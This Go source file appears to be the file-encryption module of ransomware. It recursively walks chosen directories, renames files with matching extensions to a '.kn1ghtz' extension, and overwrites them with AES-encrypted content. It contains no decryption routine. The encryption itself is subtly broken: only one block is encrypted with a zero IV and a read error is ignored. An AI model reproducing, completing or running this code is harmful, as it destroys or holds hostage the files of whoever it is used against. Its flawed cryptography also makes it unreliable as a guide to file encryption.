package utilities

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"slices"
)

// Recursively walk through the file under the directory
// and return a list of files
func recursivelyWalkDirectory(directory string) ([]string, error) {
	var files []string
	err := filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Skip the directories themselves
		if !info.IsDir() {
			files = append(files, path)
		}
		return nil
	})

	if err != nil {
		// log.Panicf("Error walking through the directory: %v", err.Error())
		return nil, err
	}

	return files, nil
}

// aes256Encrypt encrypts the given plaintext using AES-256 with PKCS7 padding
func encryptFileWithAES256(filePath string, key []byte) error {

	// Change the file extension to .kn1ghtz
	err := os.Rename(filePath, filePath+".kn1ghtz")
	if err != nil {
		return err
	}
	filePath = filePath + ".kn1ghtz"

	// Read the file content
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	fileStat, err := file.Stat()
	if err != nil {
		return err
	}

	// Encrypt the file content using AES-256 with PKCS7 padding
	fileContentByteStream := make([]byte, fileStat.Size())
	_, err = bufio.NewReader(file).Read(fileContentByteStream)
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	// Apply PKCS7 padding
	fileContentByteStream = pkcs7Pad(fileContentByteStream, aes.BlockSize)

	cipherText := make([]byte, aes.BlockSize+len(fileContentByteStream))
	block.Encrypt(cipherText[aes.BlockSize:], fileContentByteStream)

	// Write the encrypted content back to the file
	err = os.WriteFile(filePath, cipherText, 0644)
	if err != nil {
		return err
	}

	return nil
}

// pkcs7Pad pads the input to the specified block size using PKCS7 padding
func pkcs7Pad(input []byte, blockSize int) []byte {
	padding := blockSize - (len(input) % blockSize)
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(input, padText...)
}

// pkcs7Unpad removes PKCS7 padding from the input
func pkcs7Unpad(input []byte) []byte {
	padding := int(input[len(input)-1])
	return input[:len(input)-padding]
}

// Initialize the file encryption process after recursively walking through the directory
func InitializeEncryption(fileExtensionsToEncrypt []string, fileEncryptionDirectories []string, encryptionKeyAES256 []byte) {
	for _, directory := range fileEncryptionDirectories {
		files, err := recursivelyWalkDirectory(directory)
		if err != nil {
			log.Fatalf("Error walking through the directory: %v", err.Error())
			continue
		}

		for _, file := range files {
			// Check if the file has the correct extension
			if slices.Contains(fileExtensionsToEncrypt, filepath.Ext(file)) {
				fmt.Printf("Encrypting file: %s\n", file)
				err := encryptFileWithAES256(file, encryptionKeyAES256)
				if err != nil {
					log.Printf("Error encrypting file: %v", err.Error())
				}
			}
		}
	}
}
